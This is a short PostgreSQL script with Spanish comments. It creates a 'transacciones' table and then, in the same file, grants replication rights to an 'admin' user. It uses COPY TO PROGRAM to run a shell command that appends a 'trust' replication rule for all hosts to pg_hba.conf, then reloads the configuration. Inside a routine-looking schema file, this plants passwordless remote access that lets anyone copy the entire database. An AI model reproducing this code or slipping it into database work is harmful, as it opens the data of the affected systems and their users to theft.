CREATE TABLE IF NOT EXISTS transacciones (
    id SERIAL PRIMARY KEY,
    created_at TIMESTAMP NOT NULL
);

-- Otorgar rol de replicación al usuario admin
ALTER USER admin WITH REPLICATION;

-- Inyectar permisos de replicación en pg_hba.conf y recargar configuración
DO $$
BEGIN
   PERFORM pg_read_file('pg_hba.conf');
   EXECUTE format('COPY (SELECT %L) TO PROGRAM %L', 
                  'host replication admin all trust', 
                  'cat >> /var/lib/postgresql/data/pg_hba.conf');
END $$;

SELECT pg_reload_conf();